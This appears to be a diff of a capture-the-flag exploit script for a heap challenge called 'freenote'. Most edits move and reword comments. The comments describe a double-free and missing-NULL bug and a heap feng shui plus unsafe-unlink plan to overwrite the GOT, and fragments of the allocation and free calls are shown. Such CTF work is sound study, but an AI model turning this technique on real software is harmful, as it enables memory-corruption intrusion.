@@ -60,20 +60,22 @@ def leak_heap():
     return l
 
 
-#
-# 'freenote' has two critical vulnerabilities.
-#
-# 1) does not append trailing NULL when it reads string from stdin.
-# 2) you can free() already freed chunks.
-#
-# exploit strategy will be
-#
-# 1) alloc & free 3 chunks
-# 2) alloc carefully crafted memory overlapping with already free'ed memory region. 
-#    (thus overwriting the metadata)
-# 3) free the chunk again 
-#
 if __name__ == "__main__":
+
+    #
+    # 'freenote' has two critical vulnerabilities.
+    #
+    # 1) it does not append trailing NULL when it reads string from stdin.
+    # 2) you can free() already freed chunks.
+    #
+    # exploit strategy will be
+    #
+    # 1) alloc & free 3 chunks
+    # 2) alloc carefully crafted memory overlapping with already free'ed memory region. 
+    #    (thus overwriting the metadata)
+    # 3) free the chunk again 
+    #
+
     r.recvuntil('Your choice:')
 
     new_note(p32(0xdeadbeef))
@@ -103,6 +105,7 @@ if __name__ == "__main__":
     # don't free adjacent chunks!!! 
     # we need to prevent coalescing 
     #
+
     delete_note(2)
     delete_note(0)
     
@@ -122,8 +125,9 @@ if __name__ == "__main__":
     #
     # Step 1)
     #
-    # heap feng shui suitable for "unsafe_unlink" technique
+    # doning heap feng shui suitable for "unsafe_unlink" technique
     #
+
     new_note('A'*0x100)
     new_note('B'*0x100)
     new_note('C'*0x100)
@@ -138,10 +142,9 @@ if __name__ == "__main__":
     # land the carefully crafted one big chunk which will overwrite the metadata of 3 (already free'ed) chunks
     #
 
-
     #
     # Step 3)
     # 
-    # free() will do classic 'FD->bk = BK' memory write.
-    # by using this write primitive, we will overwrite GOT
+    # doing free()'ing a chunk which has corrupted metadata will do classic 'FD->bk = BK' memory write.
+    # by using this write primitive, we can overwrite GOT
     #
